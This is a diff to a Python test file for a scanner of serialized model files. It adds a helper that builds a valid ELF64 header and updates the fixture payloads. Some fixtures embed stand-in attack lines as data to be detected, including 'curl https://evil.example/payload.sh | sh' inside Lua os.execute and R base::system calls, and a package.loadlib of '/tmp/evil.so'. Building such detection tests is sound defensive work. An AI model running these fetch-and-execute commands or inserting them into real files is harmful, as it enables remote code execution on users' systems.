@@ -58,6 +58,16 @@ from tests.helpers import (
 _SYSTEM_GLOBAL_NAMES = ("os.system", "posix.system", "nt.system")
 
 
+def _valid_elf64_header() -> bytes:
+    header = bytearray(b"\x00" * 64)
+    header[:4] = b"\x7fELF"
+    header[4:7] = b"\x02\x01\x01"
+    header[16:18] = (2).to_bytes(2, "little")
+    header[18:20] = (62).to_bytes(2, "little")
+    header[20:24] = (1).to_bytes(4, "little")
+    return bytes(header)
+
+
 def test_multi_file_directory_scan_shares_one_pickle_source_snapshot(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
@@ -4164,9 +4174,12 @@ def test_scan_file_routes_raw_bin_without_zip_structure_to_pytorch_binary(tmp_pa
 @pytest.mark.parametrize(
     ("payload", "supplemental_scanner"),
     [
-        (b"RKNN\x01\x00\x00\x00payload" + b"\x7fELF" + b"\x00" * 128, "rknn"),
-        (b"T7\x00\x00payload torch.FloatTensor nn.Sequential " + b"\x7fELF" + b"\x00" * 128, "torch7"),
-        (b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00" + b"\x7fELF" + b"\x00" * 128, "executorch"),
+        (b"RKNN\x01\x00\x00\x00payload" + _valid_elf64_header() + b"\x00" * 64, "rknn"),
+        (b"T7\x00\x00payload torch.FloatTensor nn.Sequential " + _valid_elf64_header() + b"\x00" * 64, "torch7"),
+        (
+            b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00" + _valid_elf64_header() + b"\x00" * 64,
+            "executorch",
+        ),
     ],
     ids=["rknn", "torch7", "executorch"],
 )
@@ -4191,8 +4204,7 @@ def test_scan_file_merges_torch7_security_analysis_for_signature_valid_bin(tmp_p
     model_path.write_bytes(
         b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
         b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
-        b"local lib = package.loadlib('/tmp/evil.so', 'run')\n"
-        b"\x7fELF" + b"\x00" * 128
+        b"local lib = package.loadlib('/tmp/evil.so', 'run')\n" + _valid_elf64_header() + b"\x00" * 64
     )
 
     result = scan_file(str(model_path), config={"cache_scan_results": False})
@@ -4212,8 +4224,7 @@ def test_scan_file_merges_r_serialized_security_analysis_for_signature_valid_bin
     model_path = tmp_path / "payload.bin"
     model_path.write_bytes(
         b"RDX3\nX\nworkspace\nmodel\nexpression\nlanguage\n"
-        b"base::system('curl https://evil.example/payload.sh | sh')\n"
-        b"\x7fELF" + b"\x00" * 128
+        b"base::system('curl https://evil.example/payload.sh | sh')\n" + _valid_elf64_header() + b"\x00" * 64
     )
 
     result = scan_file(str(model_path), config={"cache_scan_results": False})
